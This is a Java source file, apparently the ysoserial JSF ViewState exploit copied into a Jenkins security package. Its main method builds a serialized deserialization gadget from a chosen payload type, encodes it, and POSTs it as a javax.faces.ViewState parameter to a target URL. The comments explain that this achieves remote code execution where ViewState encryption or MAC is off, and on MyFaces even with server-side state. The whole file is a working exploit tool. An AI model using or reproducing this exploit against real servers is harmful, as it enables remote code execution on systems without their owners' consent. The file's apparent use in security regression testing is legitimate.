/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package jenkins.security.security218.ysoserial.exploit;


import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

import org.apache.commons.codec.binary.Base64;

import jenkins.security.security218.ysoserial.payloads.ObjectPayload.Utils;


/**
 * JSF view state exploit
 * 
 * Delivers a gadget payload via JSF ViewState token.
 * 
 * This will only work if ViewState encryption/mac is disabled.
 * 
 * While it has been long known that client side state saving
 * with encryption disabled leads to RCE via EL injection,
 * this of course also works with deserialization gadgets.
 * 
 * Also, it turns out that MyFaces is vulnerable to this even when 
 * using server-side state saving
 * (yes, please, let's (de-)serialize a String as an Object).   
 * 
 * @author mbechler
 *
 */
public class JSF {

    public static void main ( String[] args ) {

        if ( args.length < 3 ) {
            System.err.println(JSF.class.getName() + " <view_url> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);

        try {
            URL u = new URL(args[ 0 ]);

            URLConnection c = u.openConnection();
            if ( ! ( c instanceof HttpURLConnection ) ) {
                throw new IllegalArgumentException("Not a HTTP url");
            }

            HttpURLConnection hc = (HttpURLConnection) c;
            hc.setDoOutput(true);
            hc.setRequestMethod("POST");
            hc.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = hc.getOutputStream();

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(payloadObject);
            oos.close();
            byte[] data = bos.toByteArray();
            String requestBody = "javax.faces.ViewState=" + URLEncoder.encode(Base64.encodeBase64String(data), "US-ASCII");
            os.write(requestBody.getBytes("US-ASCII"));
            os.close();

            System.err.println("Have response code " + hc.getResponseCode() + " " + hc.getResponseMessage());
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[1], payloadObject);

    }



}
